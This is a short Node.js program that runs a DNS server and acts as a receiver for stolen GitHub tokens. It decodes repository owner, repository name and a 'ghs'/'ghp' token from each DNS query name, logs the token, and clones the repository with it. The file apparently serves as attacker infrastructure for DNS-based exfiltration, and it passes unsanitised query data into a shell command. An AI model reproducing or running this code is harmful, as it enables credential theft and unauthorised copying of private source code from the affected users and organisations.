const dns = require("native-dns");
const server = dns.createServer();
const util = require("node:util");
const { exec: execCb } = require("node:child_process");
const exec = util.promisify(execCb);

function dnsResponse(name) {
  return dns.A({
    name,
    address: "10.0.0.1", //this IP address is non-consequential, it could be anything
    ttl: 60,
  });
}

server.on("request", (request, response) => {
  request.question.forEach((question) => {
    console.log("DNS Question:", question);
    if (question.name === "test.dnsx.github.com") {
      response.answer.push(dnsResponse(question.name));
      response.send();
      return;
    }

    const [owner, repo, token] = question.name.split(".").slice(0, 3);
    if (!token || !["ghs", "ghp"].includes(token.slice(0, 3))) {
      console.error("Invalid token:", token);
      response.answer.push(dnsResponse(question.name));
      response.send();
      return;
    }

    fullRepo = `${owner}/${repo}`;
    console.log(`Repo: ${fullRepo}, Token: ${token}`);
    exec(`git clone https://thanks:${token}@github.com/${fullRepo}.git`).catch(
      (err) => {
        console.error("Error:", err);
      }
    );
    response.answer.push(dnsResponse(question.name));
    response.send();
  });
});

server.on("error", (err) => {
  console.error("Server error:", err);
});

console.log("serving on 5353");

server.serve(5353);
